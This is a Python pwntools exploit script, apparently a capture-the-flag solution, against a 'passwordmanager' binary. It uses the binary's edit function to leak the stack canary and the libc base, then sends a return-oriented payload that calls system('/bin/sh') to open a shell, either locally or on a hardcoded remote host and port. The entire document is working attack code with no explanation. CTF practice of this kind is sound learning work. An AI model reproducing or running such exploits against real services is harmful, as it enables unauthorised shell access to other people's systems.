#!/usr/bin/python3

from pwn import *

exe = ELF('passwordmanager', checksec=False)
libc = ELF('libc6_2.37-0ubuntu1_amd64.so', checksec=False)

context.binary = exe

info = lambda msg: log.info(msg)
sla = lambda msg, data: r.sendlineafter(msg, data)
sa = lambda msg, data: r.sendafter(msg, data)
sl = lambda data: r.sendline(data)
s = lambda data: r.send(data)
sln = lambda msg, num: sla(msg, str(num).encode())
sn = lambda msg, num: sa(msg, str(num).encode())

def add_cred(idx, size, data=b'chino', check = 0):
    sln(b'> ', 1)
    sln(b'Index: ', idx)
    sln(b'Size: ', size)
    if (check):
        sa(b'Data: ', data)
    
def edit_cred(idx, data, yn=b'y'):
    sln(b'> ', 2)
    sln(b'Index: ', idx)
    r.recvuntil(b'Old data: ')
    out = r.recvline(False)
    sa(b'data: ', data)
    sla(b'[y/n]: ', yn)
    return out

def delete(idx, yn=b'y'):
    sln(b'> ', 3)
    sln(b'Index: ', idx)
    sla(b'[y/n]: ', yn)
    
def xor(key, data):
    cipher = b''
    for i in range(len(data)):
        cipher += p8(key[i%8] ^ data[i])
    return cipher
    
def en_de():
    sln(b'> ', 4)
    
def GDB():
    gdb.attach(r, gdbscript='''
        b*main+132
        b*lock_n_lock+618
        b*lock_n_lock+300
        b*edit_cred+572
        c
    ''')

if args.REMOTE:
    r = remote('103.162.14.116', 10002)
else:
    r = process(exe.path)
    # GDB()

add_cred(0, 0x00001ff00000000)
edit_cred(1, b'a'*256)
add_cred(2, 0x19, b'a'*0x14 + b'abcd' + b'e', 1)
canary = u64(edit_cred(2, b'a'*0x84 + b'abcd').split(b'abcd')[1][0:8]) - ord('e')
print('canary: ' + hex(canary))

libc.address = u64(edit_cred(2, b'a'*0x84 + b'abcd').split(b'abcd')[1] + b'\x00'*2) - 0x23a90
print('libc_base: ' + hex(libc.address))

delete(1)
delete(2)
en_de()

pop_rdi = 0x00000000000240e5 + libc.address
payload = flat(
    b'a'*0x8,
    canary, 0,
    pop_rdi,
    next(libc.search(b'/bin/sh')),
    pop_rdi+1,
    libc.sym['system']
)
add_cred(2, len(payload), payload, 1)
add_cred(0, 0x000001ff00000000)
sln(b'> ', 2)
sln(b'Index: ', 1)



r.interactive()
